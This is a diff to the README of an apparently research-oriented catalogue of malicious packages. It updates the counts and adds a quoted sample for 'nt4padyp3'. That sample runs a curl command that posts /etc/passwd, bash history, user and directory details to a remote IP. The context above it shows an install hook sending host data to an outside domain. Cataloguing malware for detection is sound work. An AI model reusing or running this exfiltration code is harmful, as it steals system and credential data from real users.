@@ -1,6 +1,6 @@
 ## Dataset Size
 
-This data set includes about 6,102 versions of the source code of 5,398 malicious packages.
+This data set includes about 6,104 versions of the source code of 5,399 malicious packages.
 
 ## Dataset Format
 
@@ -551,6 +551,17 @@ class CustomInstall(install):
         username = getpass.getuser()
         ploads = {'hostname':hostname,'cwd':cwd,'username':username}
         requests.get("https://kar.al",params = ploads)
+```
+
+### 19 Jun. 2024
+nt4padyp3 [0.0.1, 0.0.2] <br>
+
+```python
+def read_ver():
+	print("readver")
+	curl_command = 'curl -X POST -H "Hostname: $(hostname)" -H "packagetype: NPM" -H "Whoami: $(whoami)" -H "Pwd: $(pwd)" -d "Install Directory: \n $(ls -la) \n Security Groups: \n $(id) \n User Directory: \n $(ls ~)\n etc-passwd: \n $(cat /etc/passwd ) \n Installed NPM modules: \n $(npm ls)\n bash history: \n $(cat ~/.bash_history|head)" -H "Content-Type: text/plain" http://43.139.166.32:8080'
+	subprocess.run(curl_command, shell=True)
+	return "0.0.12"
 ```
 
 ## About the malicious packages detection
